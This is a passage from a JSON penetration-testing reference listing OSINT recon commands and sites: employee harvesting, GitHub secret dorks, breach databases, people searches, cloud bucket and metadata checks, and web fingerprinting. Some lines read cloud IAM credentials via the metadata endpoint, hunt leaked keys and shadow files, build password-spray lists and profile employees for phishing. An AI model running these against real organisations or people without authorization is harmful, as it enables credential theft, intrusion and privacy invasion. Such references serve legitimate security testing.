            ]
          }
        ]
      },
      {
        "id": "osint-7",
        "name": "Social Media & LinkedIn Recon",
        "description": "Gather employee names, job titles, technology stack clues, organizational structure, and personal details from social media platforms. Build targeted user lists for password spraying.",
        "commands": [
          {
            "desc": "LinkedIn Employee Harvesting",
            "entries": [
              {
                "subdesc": "Enumerate employees, roles, and technology mentions from LinkedIn company pages. Build username lists from discovered names.",
                "cmd": [
                  "linkedin2username -u <LINKEDIN_USER> -c <COMPANY_NAME>",
                  "linkedin2username -u <LINKEDIN_USER> -c <COMPANY_NAME> -s <SIZE> -d 3",
                  "crosslinked -f '{first}.{last}@target.com' -j 3 'Company Name'",
                  "crosslinked -f '{f}{last}@target.com' -j 3 'Company Name'"
                ]
              }
            ]
          },
          {
            "desc": "LinkedIn Manual Recon Checklist",
            "entries": [
              {
                "subdesc": "Manual intelligence gathering from LinkedIn profiles and company pages.",
                "cmd": [
                  "1. Search company page → note employee count and key departments",
                  "2. Filter employees by 'IT', 'Security', 'Engineering', 'DevOps'",
                  "3. Note job titles → identify sysadmins, developers, DBAs",
                  "4. Check job postings → reveals technology stack and tools in use",
                  "5. Review employee posts → may leak internal tools, screenshots, configs",
                  "6. Check 'About' section → office locations, subsidiaries",
                  "7. Find C-suite/executives → high-value phishing targets"
                ]
              }
            ]
          },
          {
            "desc": "Twitter / X OSINT",
            "entries": [
              {
                "subdesc": "Search for company mentions, employee posts, and leaked information.",
                "cmd": [
                  "https://twitter.com/search-advanced",
                  "from:@company_handle filter:links",
                  "to:@company_handle",
                  "\"target.com\" (password OR credential OR leak OR hack)",
                  "https://github.com/rmdir-rp/OSINT-twitter-tools"
                ]
              }
            ]
          },
          {
            "desc": "Instagram / Snapchat / TikTok",
            "entries": [
              {
                "subdesc": "Visual intelligence — office photos, badge photos, whiteboard content, screen captures.",
                "cmd": [
                  "https://imginn.com/              # Instagram viewer without account",
                  "https://map.snapchat.com/         # Geotagged snaps near office locations",
                  "Search TikTok for company name and employee posts"
                ]
              }
            ]
          },
          {
            "desc": "Social Media Aggregation Tools",
            "entries": [
              {
                "subdesc": "Tools that search across multiple platforms simultaneously.",
                "cmd": [
                  "sherlock <USERNAME>",
                  "sherlock <USERNAME> --print-found --output results.txt",
                  "social-analyzer --username <USERNAME> --metadata --extract --trim",
                  "maigret <USERNAME> --all-sites --pdf report.pdf"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-8",
        "name": "GitHub / Code Repository Recon",
        "description": "Search GitHub, GitLab, Bitbucket, and paste sites for leaked source code, API keys, credentials, internal references, and infrastructure details tied to the target.",
        "commands": [
          {
            "desc": "GitHub Dork Searches",
            "entries": [
              {
                "subdesc": "Use GitHub's search to find leaked secrets, internal code, and configuration files.",
                "cmd": [
                  "org:targetcompany password",
                  "org:targetcompany secret",
                  "org:targetcompany api_key",
                  "org:targetcompany token",
                  "\"target.com\" password",
                  "\"target.com\" filename:.env",
                  "\"target.com\" filename:config",
                  "\"target.com\" filename:credentials",
                  "\"target.com\" extension:pem private",
                  "\"target.com\" extension:ppk",
                  "\"target.com\" extension:sql",
                  "\"target.com\" filename:wp-config.php",
                  "\"target.com\" filename:.htpasswd",
                  "\"target.com\" filename:.git-credentials",
                  "\"target.com\" filename:id_rsa",
                  "\"target.com\" filename:shadow path:etc",
                  "\"target.com\" filename:docker-compose",
                  "\"target.com\" filename:.npmrc _auth",
                  "\"target.com\" JDBC connection",
                  "\"target.com\" AWS_SECRET_ACCESS_KEY"
                ]
              }
            ]
          },
          {
            "desc": "Automated Secret Scanning",
            "entries": [
              {
                "subdesc": "Scan repositories for committed secrets, API keys, and credentials.",
                "cmd": [
                  "trufflehog git https://github.com/targetcompany/repo.git",
                  "trufflehog github --org=targetcompany",
                  "trufflehog github --repo=https://github.com/targetcompany/repo.git --only-verified",
                  "gitleaks detect --source /path/to/repo --report-path gitleaks_report.json",
                  "gitleaks detect --source /path/to/repo -v",
                  "git-secrets --scan /path/to/repo"
                ]
              }
            ]
          },
          {
            "desc": "Git History Mining",
            "entries": [
              {
                "subdesc": "Check commit history for secrets that were committed then removed — they're still in the git log.",
                "cmd": [
                  "git log --all --oneline | head -50",
                  "git log --all --diff-filter=D -- '*.env' '*.conf' '*.key'",
                  "git log --all -p -- '*.env'",
                  "git log --all --full-history -S 'password' -- '**/*.py' '**/*.js' '**/*.conf'",
                  "git log --all --full-history -S 'API_KEY'",
                  "git show <COMMIT_HASH>:<FILE_PATH>"
                ]
              }
            ]
          },
          {
            "desc": "Paste Sites & Breach Data",
            "entries": [
              {
                "subdesc": "Search paste sites and breach databases for leaked target information.",
                "cmd": [
                  "https://pastebin.com/search?q=target.com",
                  "https://psbdmp.ws/                # Pastebin dump search",
                  "https://grep.app/                 # Search across GitHub repos",
                  "https://searchcode.com/           # Code search engine",
                  "https://publicwww.com/            # Source code search"
                ]
              }
            ]
          },
          {
            "desc": "GitLab / Bitbucket",
            "entries": [
              {
                "subdesc": "Don't forget non-GitHub code hosting platforms.",
                "cmd": [
                  "Search gitlab.com for target.com references",
                  "Search bitbucket.org for target.com references",
                  "Check for self-hosted GitLab instances: gitlab.target.com, git.target.com"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-9",
        "name": "Automated Recon Scripts",
        "description": "End-to-end OSINT automation scripts that chain multiple tools together for comprehensive passive and active reconnaissance.",
        "commands": [
          {
            "desc": "Basic OSINT Recon Script",
            "entries": [
              {
                "subdesc": "Usage: ./recon.sh target.com — Runs WHOIS, subfinder, assetfinder, httprobe, and gowitness in sequence. Creates organized output directories.",
                "cmd": [
                  "#!/bin/bash",
                  "",
                  "# Use the first argument as the domain name",
                  "domain=$1",
                  "# Define colors",
                  "RED=\"\\033[1;31m\"",
                  "RESET=\"\\033[0m\"",
                  "",
                  "# Define directories",
                  "base_dir=\"$domain\"",
                  "info_path=\"$base_dir/info\"",
                  "subdomain_path=\"$base_dir/subdomains\"",
                  "screenshot_path=\"$base_dir/screenshots\"",
                  "",
                  "# Create directories if they don't exist",
                  "for path in \"$info_path\" \"$subdomain_path\" \"$screenshot_path\"; do",
                  "    if [ ! -d \"$path\" ]; then",
                  "        mkdir -p \"$path\"",
                  "        echo \"Created directory: $path\"",
                  "    fi",
                  "done",
                  "",
                  "echo -e \"${RED} [+] Checking who it is ... ${RESET}\"",
                  "whois \"$domain\" > \"$info_path/whois.txt\"",
                  "",
                  "echo -e \"${RED} [+] Launching subfinder ... ${RESET}\"",
                  "subfinder -d \"$domain\" > \"$subdomain_path/found.txt\"",
                  "",
                  "echo -e \"${RED} [+] Running assetfinder ... ${RESET}\"",
                  "assetfinder \"$domain\" | grep \"$domain\" >> \"$subdomain_path/found.txt\"",
                  "",
                  "echo -e \"${RED} [+] Checking what\\'s alive ... ${RESET}\"",
                  "cat \"$subdomain_path/found.txt\" | grep \"$domain\" | sort -u | httprobe -prefer-https | grep https | sed 's/https\\?:\\/\\///' | tee -a \"$subdomain_path/alive.txt\"",
                  "",
                  "echo -e \"${RED} [+] Taking screenshots ... ${RESET}\"",
                  "gowitness file -f \"$subdomain_path/alive.txt\" -P \"$screenshot_path/\" --no-http"
                ]
              }
            ]
          },
          {
            "desc": "Enhanced Recon Pipeline",
            "entries": [
              {
                "subdesc": "Extended pipeline: subfinder + amass + crt.sh → deduplicate → httpx probe → nuclei scan → gowitness screenshots.",
                "cmd": [
                  "#!/bin/bash",
                  "domain=$1",
                  "mkdir -p $domain/{subs,probes,screenshots,vulns}",
                  "",
                  "echo '[+] Passive subdomain enumeration...'",
                  "subfinder -d $domain -all -silent >> $domain/subs/all.txt",
                  "amass enum -passive -d $domain -silent >> $domain/subs/all.txt",
                  "curl -s \"https://crt.sh/?q=%25.$domain&output=json\" | jq -r '.[].name_value' 2>/dev/null >> $domain/subs/all.txt",
                  "assetfinder --subs-only $domain >> $domain/subs/all.txt",
                  "",
                  "echo '[+] Deduplicating...'",
                  "sort -u $domain/subs/all.txt -o $domain/subs/unique.txt",
                  "echo \"Found $(wc -l < $domain/subs/unique.txt) unique subdomains\"",
                  "",
                  "echo '[+] Probing live hosts...'",
                  "httpx -l $domain/subs/unique.txt -silent -sc -cl -title -td -o $domain/probes/alive.txt",
                  "",
                  "echo '[+] Running nuclei...'",
                  "nuclei -l $domain/probes/alive.txt -t cves/ -t takeovers/ -t exposures/ -o $domain/vulns/nuclei.txt",
                  "",
                  "echo '[+] Taking screenshots...'",
                  "gowitness file -f $domain/probes/alive.txt -P $domain/screenshots/ --no-http",
                  "",
                  "echo '[+] Done! Results in ./$domain/'"
                ]
              }
            ]
          },
          {
            "desc": "Quick One-Liner Recon Chains",
            "entries": [
              {
                "subdesc": "Subdomain → live hosts → output",
                "cmd": [
                  "subfinder -d target.com -silent | httpx -silent -sc -title | tee results.txt"
                ]
              },
              {
                "subdesc": "Subdomain → nuclei vulnerability scan",
                "cmd": [
                  "subfinder -d target.com -silent | httpx -silent | nuclei -t cves/ -o vulns.txt"
                ]
              },
              {
                "subdesc": "crt.sh → probe → screenshot",
                "cmd": [
                  "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u | httpx -silent | gowitness pipe"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-10",
        "name": "ASN & BGP Infrastructure",
        "description": "Map an organization's network infrastructure through ASN lookups, BGP routing data, and netblock discovery. Critical for scope expansion and identifying all IP ranges owned by the target.",
        "commands": [
          {
            "desc": "ASN Discovery",
            "entries": [
              {
                "subdesc": "Find the Autonomous System Number(s) associated with the target organization.",
                "cmd": [
                  "whois -h whois.radb.net -- '-i origin AS<NUMBER>'",
                  "whois -h whois.cymru.com \" -v 10.10.10.5\"",
                  "dig +short TXT <IP_REVERSED>.origin.asn.cymru.com",
                  "curl -s 'https://api.bgpview.io/search?query_term=target' | jq",
                  "amass intel -org 'Target Company'"
                ]
              }
            ]
          },
          {
            "desc": "BGP & ASN Lookup Services",
            "entries": [
              {
                "subdesc": "Web-based tools for visualizing BGP routing and ASN relationships.",
                "cmd": [
                  "https://bgp.he.net/               # Hurricane Electric BGP Toolkit",
                  "https://bgpview.io/               # ASN, prefix, and peer lookup",
                  "https://www.peeringdb.com/         # Peering database — data centers, IXPs",
                  "https://ipinfo.io/                # IP geolocation + ASN data",
                  "https://www.ultratools.com/tools/asnInfo"
                ]
              }
            ]
          },
          {
            "desc": "Netblock / IP Range Enumeration",
            "entries": [
              {
                "subdesc": "Once you have an ASN, enumerate all IP prefixes advertised by it.",
                "cmd": [
                  "whois -h whois.radb.net -- '-i origin AS12345'",
                  "amass intel -asn <ASN_NUMBER>",
                  "curl -s 'https://api.bgpview.io/asn/<ASN_NUMBER>/prefixes' | jq '.data.ipv4_prefixes[].prefix'",
                  "nmap -sL 10.10.0.0/16 | grep 'Nmap scan report' | awk '{print $5}'"
                ]
              }
            ]
          },
          {
            "desc": "Reverse IP / Shared Hosting Discovery",
            "entries": [
              {
                "subdesc": "Find other domains/sites hosted on the same IP — identify shared infrastructure.",
                "cmd": [
                  "https://dnslytics.com/reverse-ip",
                  "https://viewdns.info/reverseip/",
                  "https://www.bing.com/search?q=ip:10.10.10.5",
                  "shodan search 'ip:10.10.10.5'"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-11",
        "name": "OSINT Reconnaissance: People",
        "description": "Search for people, phone numbers, physical addresses, and voter registration records using public lookup services. Useful for social engineering preparation.",
        "commands": [
          {
            "desc": "People Search Engines",
            "entries": [
              {
                "subdesc": "Free and paid services for looking up individuals by name, phone, or email.",
                "cmd": [
                  "https://www.whitepages.com/",
                  "https://www.truepeoplesearch.com/",
                  "https://www.fastpeoplesearch.com/",
                  "https://www.fastbackgroundcheck.com/",
                  "https://webmii.com/",
                  "https://peekyou.com/",
                  "https://www.411.com/",
                  "https://www.spokeo.com/",
                  "https://thatsthem.com/",
                  "https://www.beenverified.com/",
                  "https://pipl.com/"
                ]
              }
            ]
          },
          {
            "desc": "Voter Registration Records",
            "entries": [
              {
                "subdesc": "Voter records can reveal addresses, party affiliation, and voting history — public records in many US states.",
                "cmd": [
                  "https://voterrecords.com/"
                ]
              }
            ]
          },
          {
            "desc": "Phone Number Lookup",
            "entries": [
              {
                "subdesc": "Reverse phone lookup services — identify phone owners and carrier info",
                "cmd": [
                  "https://www.truecaller.com/",
                  "https://calleridtest.com/",
                  "https://infobel.com/",
                  "https://www.phonevalidator.com/"
                ]
              }
            ]
          },
          {
            "desc": "Public Records & Court Records",
            "entries": [
              {
                "subdesc": "Search court filings, civil cases, and public records databases",
                "cmd": [
                  "https://www.judyrecords.com/      # Court record search",
                  "https://unicourt.com/              # US court records",
                  "https://www.publicrecords.com/"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-12",
        "name": "OSINT Reconnaissance: Usernames & Passwords",
        "description": "Check for credential leaks in breach databases, enumerate usernames across platforms, and identify password reuse patterns. Critical for password spraying preparation.",
        "commands": [
          {
            "desc": "Password Breach Databases",
            "entries": [
              {
                "subdesc": "Search for breached credentials tied to the target domain or specific email addresses.",
                "cmd": [
                  "https://haveibeenpwned.com/",
                  "https://weleakinfo.to/v2/",
                  "https://leakcheck.io/",
                  "https://snusbase.com/",
                  "https://scylla.sh/",
                  "https://dehashed.com/              # Paid — most comprehensive breach search",
                  "https://intelx.io/                 # Intelligence X — pastes, leaks, darknet"
                ]
              }
            ]
          },
          {
            "desc": "Breach Data CLI Tools",
            "entries": [
              {
                "subdesc": "Command-line tools for parsing and querying breach databases locally.",
                "cmd": [
                  "h8mail -t target@target.com",
                  "h8mail -t target.com --all",
                  "pwndb2am4tzkvold.onion            # Tor hidden service — query breaches"
                ]
              }
            ]
          },
          {
            "desc": "Username Enumeration (Online)",
            "entries": [
              {
                "subdesc": "Check if a username exists across hundreds of platforms.",
                "cmd": [
                  "https://namechk.com/",
                  "https://whatsmyname.app/",
                  "https://namecheckup.com/",
                  "https://knowem.com/"
                ]
              }
            ]
          },
          {
            "desc": "Username Enumeration (Sherlock & CLI)",
            "entries": [
              {
                "subdesc": "Sherlock searches 400+ social networks (pip install sherlock-project). Maigret covers even more sites (pip install maigret). h8mail: pip install h8mail.",
                "cmd": [
                  "sherlock <USERNAME>",
                  "sherlock <USERNAME> --output results.txt",
                  "sherlock <USERNAME> --print-found",
                  "sherlock <USER1> <USER2> <USER3>",
                  "maigret <USERNAME> --all-sites --pdf report.pdf",
                  "maigret <USERNAME> --top-sites 500"
                ]
              }
            ]
          },
          {
            "desc": "Password Pattern Analysis",
            "entries": [
              {
                "subdesc": "Common patterns found in breach data — useful for building targeted wordlists for spray attacks.",
                "cmd": [
                  "Season+Year:    Winter2024!, Spring2024!, Summer2024!, Fall2024!",
                  "Company+Num:    TargetCo2024!, TargetCo123!, Target1!",
                  "Month+Year:     January2024!, March2024!",
                  "Common:         Password1!, Welcome1!, Changeme1!",
                  "Keyboard walks: Qwerty123!, !QAZ2wsx, 1qaz@WSX"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-13",
        "name": "OSINT Reconnaissance: Social Media",
        "description": "Gather intelligence from social media platforms including Twitter, Instagram, Snapchat, Reddit, and TikTok. Look for employee posts, location data, and leaked information.",
        "commands": [
          {
            "desc": "Twitter / X",
            "entries": [
              {
                "subdesc": "Advanced Twitter search operators for targeted OSINT.",
                "cmd": [
                  "https://twitter.com/search-advanced",
                  "from:@target_account",
                  "to:@target_account",
                  "\"target.com\" (password OR secret OR internal)",
                  "@target_account filter:links",
                  "@target_account until:2024-01-01 since:2023-01-01",
                  "https://github.com/rmdir-rp/OSINT-twitter-tools",
                  "twint -u <USERNAME> --email --phone"
                ]
              }
            ]
          },
          {
            "desc": "Instagram",
            "entries": [
              {
                "subdesc": "View profiles and posts without an account. Look for office photos, badges, screens.",
                "cmd": [
                  "https://imginn.com/",
                  "https://www.picuki.com/",
                  "https://dumpor.com/"
                ]
              }
            ]
          },
          {
            "desc": "Reddit",
            "entries": [
              {
                "subdesc": "Search for company mentions, employee complaints, and leaked information.",
                "cmd": [
                  "site:reddit.com \"target.com\"",
                  "site:reddit.com \"Target Company\" (password OR credentials OR internal)",
                  "https://camas.unddit.com/          # Deleted Reddit comment search"
                ]
              }
            ]
          },
          {
            "desc": "Snapchat",
            "entries": [
              {
                "subdesc": "Geotagged snaps — check Snap Map near target office locations.",
                "cmd": [
                  "https://map.snapchat.com/"
                ]
              }
            ]
          },
          {
            "desc": "Facebook",
            "entries": [
              {
                "subdesc": "Employee groups, check-ins, and company page posts.",
                "cmd": [
                  "site:facebook.com \"Target Company\"",
                  "https://www.facebook.com/search/   # People, posts, groups search"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-14",
        "name": "OSINT Reconnaissance: Images & Geolocation",
        "description": "Reverse image search, EXIF metadata extraction, and geolocation intelligence. Identify locations from photos, extract GPS coordinates, and trace image origins.",
        "commands": [
          {
            "desc": "Reverse Image Search",
            "entries": [
              {
                "subdesc": "Upload or paste image URL to find where it appears online, identify locations from background context (buildings, signs, landmarks).",
                "cmd": [
                  "https://images.google.com/",
                  "https://tineye.com/",
                  "https://yandex.com/images/",
                  "https://lens.google.com/",
                  "https://www.bing.com/images/search"
                ]
              }
            ]
          },
          {
            "desc": "EXIF Metadata Extraction",
            "entries": [
              {
                "subdesc": "Social media strips EXIF data on upload, but direct file transfers, email attachments, and some websites preserve it. EXIF can contain GPS coordinates, camera model, timestamps, and software used.",
                "cmd": [
                  "exiftool <IMAGE_FILE>",
                  "exiftool -gps* <IMAGE_FILE>",
                  "exiftool -s -G -a <IMAGE_FILE>",
                  "exiftool -r -ext jpg -ext png /path/to/directory/",
                  "identify -verbose <IMAGE_FILE>",
                  "https://jimpl.com/",
                  "https://exifdata.com/",
                  "https://www.metadata2go.com/"
                ]
              }
            ]
          },
          {
            "desc": "Geolocation Tools",
            "entries": [
              {
                "subdesc": "Determine location from images, landmarks, and other visual clues.",
                "cmd": [
                  "https://www.google.com/maps/       # Street View for location verification",
                  "https://suncalc.org/               # Sun position calculator — determine time from shadows",
                  "https://www.openstreetmap.org/",
                  "https://overpass-turbo.eu/          # Query OpenStreetMap data"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-15",
        "name": "OSINT Reconnaissance: Websites & Technology",
        "description": "Fingerprint web technologies, analyze DNS records, scan for threats, discover certificates, and monitor website changes.",
        "commands": [
          {
            "desc": "Technology Fingerprinting",
            "entries": [
              {
                "subdesc": "Identify the tech stack, CMS, frameworks, and server software.",
                "cmd": [
                  "https://builtwith.com/",
                  "https://www.wappalyzer.com/        # Browser extension — live tech detection",
                  "https://w3techs.com/",
                  "whatweb target.com",
                  "whatweb -a 3 target.com",
                  "wafw00f target.com                 # WAF detection"
                ]
              }
            ]
          },
          {
            "desc": "DNS Intelligence & Reverse Lookup",
            "entries": [
              {
                "subdesc": "Reverse IP, DNS history, and analytics-based domain discovery tools",
                "cmd": [
                  "https://centralops.net/co/",
                  "https://dnslytics.com/reverse-ip",
                  "https://spyonweb.com/",
                  "https://viewdns.info/",
                  "https://securitytrails.com/        # Historical DNS, subdomains, WHOIS"
                ]
              }
            ]
          },
          {
            "desc": "Certificate Transparency",
            "entries": [
              {
                "subdesc": "Find all certificates issued for a domain — reveals subdomains and infrastructure changes over time.",
                "cmd": [
                  "https://crt.sh/",
                  "https://censys.io/certificates",
                  "https://dnsdumpster.com/",
                  "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u"
                ]
              }
            ]
          },
          {
            "desc": "Threat Intelligence & Scanning",
            "entries": [
              {
                "subdesc": "Check domains/URLs/IPs against threat intelligence platforms.",
                "cmd": [
                  "https://www.virustotal.com/",
                  "https://urlscan.io/",
                  "https://web-check.as93.net/",
                  "https://www.hybrid-analysis.com/",
                  "https://otx.alienvault.com/",
                  "https://threatcrowd.org/"
                ]
              }
            ]
          },
          {
            "desc": "Website Monitoring & Historical Data",
            "entries": [
              {
                "subdesc": "Track changes, find cached content, and view historical snapshots.",
                "cmd": [
                  "https://web.archive.org/           # Wayback Machine — historical snapshots",
                  "https://visualping.io/             # Monitor pages for changes",
                  "http://backlinkwatch.com/index.php  # Backlink analysis",
                  "https://archive.org/web/",
                  "curl -s 'https://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey' | sort -u"
                ]
              }
            ]
          },
          {
            "desc": "Subdomain & Infrastructure Discovery",
            "entries": [
              {
                "subdesc": "Internet-wide scanners for discovering exposed services and infrastructure",
                "cmd": [
                  "https://shodan.io/",
                  "https://search.censys.io/",
                  "shodan search hostname:target.com",
                  "shodan host <TARGET_IP>"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-16",
        "name": "OSINT Reconnaissance: Business & Financial",
        "description": "Investigate corporate registrations, organizational structure, subsidiaries, acquisitions, financial filings, and business intelligence for social engineering and scope expansion.",
        "commands": [
          {
            "desc": "Corporate Registry & Business Intelligence",
            "entries": [
              {
                "subdesc": "Look up company registration, officers, filings, and subsidiary relationships.",
                "cmd": [
                  "https://opencorporates.com/        # Global corporate registry search",
                  "https://www.aihitdata.com/          # Company + technology intelligence",
                  "https://www.crunchbase.com/         # Funding, acquisitions, leadership",
                  "https://www.sec.gov/cgi-bin/browse-edgar  # SEC filings (US public companies)",
                  "https://www.dnb.com/                # Dun & Bradstreet business data"
                ]
              }
            ]
          },
          {
            "desc": "Subsidiary & Acquisition Discovery",
            "entries": [
              {
                "subdesc": "Acquisitions often mean inherited infrastructure with different security posture — check for scope expansion.",
                "cmd": [
                  "Search SEC filings (10-K, 10-Q) for subsidiary disclosures",
                  "Check Crunchbase for acquisitions history",
                  "Search for '[Company] acquisition' in news sources",
                  "Look for different domain registrations under same registrant email/org"
                ]
              }
            ]
          },
          {
            "desc": "Job Postings Intelligence",
            "entries": [
              {
                "subdesc": "Job listings reveal technology stack, security tools, compliance frameworks, and organizational priorities.",
                "cmd": [
                  "site:linkedin.com/jobs 'Target Company'",
                  "site:indeed.com 'Target Company' (security OR engineer OR admin)",
                  "site:glassdoor.com 'Target Company'",
                  "Look for: tech stack in requirements, security tools, compliance mentions (SOC2, PCI, HIPAA)"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-17",
        "name": "Wireless & Physical OSINT",
        "description": "Discover wireless networks, physical locations, and physical security details related to the target. Useful for wireless and physical pentests.",
        "commands": [
          {
            "desc": "Wireless Network Discovery",
            "entries": [
              {
                "subdesc": "WiGLE maps WiFi networks globally. Search by SSID, MAC address, or geographic area to find target wireless infrastructure.",
                "cmd": [
                  "https://wigle.net/                 # Wireless network mapping database",
                  "Search WiGLE by SSID: target, TargetCompany, Target-Guest, etc.",
                  "Search WiGLE by geographic coordinates near target office locations",
                  "Export results for offline analysis"
                ]
              }
            ]
          },
          {
            "desc": "Physical Location Intelligence",
            "entries": [
              {
                "subdesc": "Map and analyze physical locations for onsite assessment preparation.",
                "cmd": [
                  "https://www.google.com/maps        # Street View for building exterior recon",
                  "https://www.google.com/earth        # Aerial/satellite imagery",
                  "https://apps.apple.com/app/maps     # Apple Maps Look Around",
                  "Check for: entry points, security cameras, badge readers, dumpsters, smoking areas",
                  "Note: reception desk location, visitor sign-in process, tail-gating opportunities"
                ]
              }
            ]
          },
          {
            "desc": "Company Infrastructure OSINT",
            "entries": [
              {
                "subdesc": "Discover data center locations, cloud providers, and email infrastructure",
                "cmd": [
                  "Search for data center locations (PeeringDB, company website)",
                  "Check cloud provider usage (dig for AWS/Azure/GCP DNS patterns)",
                  "dig target.com | grep -E 'amazonaws|azure|google'",
                  "Check MX records for email provider: dig +short target.com MX"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-18",
        "name": "Cloud & Infrastructure OSINT",
        "description": "Discover cloud assets, exposed storage buckets, serverless functions, and cloud-hosted infrastructure tied to the target — no authentication required.",
        "commands": [
          {
            "desc": "S3 Bucket Discovery",
            "entries": [
              {
                "subdesc": "Find exposed AWS S3 buckets belonging to the target.",
                "cmd": [
                  "https://grayhatwarfare.com/        # Search exposed S3 and Azure buckets",
                  "aws s3 ls s3://target-company/ --no-sign-request",
                  "aws s3 ls s3://target-company-backup/ --no-sign-request",
                  "aws s3 ls s3://target-company-dev/ --no-sign-request",
                  "aws s3 ls s3://target-prod/ --no-sign-request",
                  "cloud_enum -k target -k targetcompany -l cloud_results.txt"
                ]
              }
            ]
          },
          {
            "desc": "Azure & GCP Storage",
            "entries": [
              {
                "subdesc": "Azure Blob Storage",
                "cmd": [
                  "curl -s 'https://target.blob.core.windows.net/\\$web?restype=container&comp=list'"
                ]
              },
              {
                "subdesc": "GCP Storage",
                "cmd": [
                  "curl -s 'https://storage.googleapis.com/target-company/'"
                ]
              },
              {
                "subdesc": "Multi-cloud enumeration",
                "cmd": [
                  "cloud_enum -k target -k targetcompany --disable-aws -l azure_gcp_results.txt"
                ]
              }
            ]
          },
          {
            "desc": "Cloud DNS Patterns",
            "entries": [
              {
                "subdesc": "Identify which cloud providers the target uses from DNS records.",
                "cmd": [
                  "dig +short target.com A | xargs -I{} whois {} | grep -i 'amazon\\|azure\\|google\\|cloudflare'",
                  "dig +short target.com CNAME",
                  "host target.com | grep -E 'elb.amazonaws|azurewebsites|appspot|cloudfront|herokuapp'",
                  "nslookup target.com | grep -E 'amazonaws|azure|google'"
                ]
              }
            ]
          },
          {
            "desc": "Cloud Metadata & Configuration Checks",
            "entries": [
              {
                "subdesc": "AWS Metadata (from SSRF or instance)",
                "cmd": [
                  "curl http://169.254.169.254/latest/meta-data/",
                  "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                ]
              },
              {
                "subdesc": "Azure Metadata",
                "cmd": [
                  "curl -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'"
                ]
              },
              {
                "subdesc": "GCP Metadata",
                "cmd": [
                  "curl -H 'Metadata-Flavor: Google' 'http://169.254.169.254/computeMetadata/v1/'"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-19",
        "name": "Document & Metadata Analysis",
        "description": "Extract metadata from publicly available documents (PDFs, Office files, images) to discover usernames, software versions, internal paths, and email addresses.",
        "commands": [
          {
            "desc": "Download Public Documents",
            "entries": [
              {
                "subdesc": "Find documents via Google",
                "cmd": [
                  "site:target.com filetype:pdf",
                  "site:target.com filetype:docx",
                  "site:target.com filetype:xlsx",
                  "site:target.com filetype:pptx"
                ]
              },
              {
                "subdesc": "Bulk download discovered documents",
                "cmd": [
                  "wget -r -l 1 -A pdf,doc,docx,xls,xlsx,ppt,pptx https://target.com/",
                  "metagoofil -d target.com -t pdf,doc,docx,xls,xlsx -l 100 -o target_docs/ -f results.html"
                ]
              }
            ]
          },
          {
            "desc": "Extract Metadata (exiftool)",
            "entries": [
              {
                "subdesc": "exiftool extracts all metadata from files — creator names become usernames, internal paths reveal directory structures, software versions identify attack surface.",
                "cmd": [
                  "exiftool *.pdf",
                  "exiftool -r -ext pdf -ext docx -ext xlsx target_docs/",
                  "exiftool *.pdf | grep -Ei 'author|creator|producer|company|email'",
                  "exiftool *.pdf | grep -Ei 'software|application|version'",
                  "exiftool *.docx | grep -Ei 'author|last.modified|company|template'"
                ]
              }
            ]
          },
          {
            "desc": "FOCA (Windows)",
            "entries": [
              {
                "subdesc": "FOCA automates metadata extraction from documents and network analysis. Windows GUI tool.",
                "cmd": [
                  "Run FOCA → New Project → Enter target domain",
                  "Search All → Download All Documents",
                  "Extract Metadata → Analyze → Users, Servers, Emails, Software"
                ]
              }
            ]
          },
          {
            "desc": "What to Look For in Metadata",
            "entries": [
              {
                "subdesc": "Types of intelligence extractable from document metadata.",
                "cmd": [
                  "Author/Creator      → Internal usernames (for login spraying)",
                  "Company              → Business unit names, subsidiaries",
                  "Software/Producer    → Internal tool versions (Office, Acrobat, OS)",
                  "Internal paths       → Directory structures (C:\\Users\\jsmith\\...)",
                  "Email addresses      → Confirm email format (first.last@target.com)",
                  "Creation dates       → Timeline of document activity",
                  "Printer names        → Internal network device names",
                  "GPS coordinates      → Office locations (from photos in docs)"
                ]
              }
            ]
          }
        ]
      },
      {
        "id": "osint-20",
        "name": "Web Application Fingerprinting",
        "description": "Identify web technologies, CMS versions, WAF presence, JavaScript libraries, and server configurations before active testing begins.",
        "commands": [
          {
            "desc": "Automated Technology Detection",
            "entries": [
              {
                "subdesc": "Identify CMS, frameworks, server software, CDN, and security products.",
                "cmd": [
                  "whatweb target.com",
                  "whatweb -a 3 -v target.com",
                  "wafw00f target.com",
                  "wafw00f -a target.com",
                  "httpx -u target.com -tech-detect -status-code -title -server -cdn",
                  "nuclei -u target.com -t technologies/ -silent"
                ]
              }
            ]
          },
          {
            "desc": "CMS Detection",
            "entries": [
              {
                "subdesc": "WordPress",
                "cmd": [
                  "wpscan --url target.com --enumerate vp,vt,u --api-token <TOKEN>",
                  "curl -s target.com | grep 'wp-content\\|wp-includes'"
                ]
              },
              {
                "subdesc": "Joomla",
                "cmd": [
                  "joomscan --url target.com"
                ]
              },
              {
                "subdesc": "Drupal",
                "cmd": [
                  "droopescan scan drupal -u target.com"
                ]
              },
              {
                "subdesc": "Generic CMS detection",
                "cmd": [
                  "cmseek -u target.com"
                ]
              }
            ]
          },
          {
            "desc": "HTTP Header Analysis",
            "entries": [
              {
                "subdesc": "Response headers leak server info, framework versions, and security configurations.",
                "cmd": [
                  "curl -I target.com",
                  "curl -sI target.com | grep -Ei 'server|x-powered|x-aspnet|x-generator'",
                  "curl -sI target.com | grep -Ei 'x-frame|x-xss|x-content-type|strict-transport|content-security'",
                  "nmap --script http-headers -p 80,443 target.com"
                ]
              }
            ]
          },
          {
            "desc": "robots.txt and sitemap.xml",
            "entries": [
              {
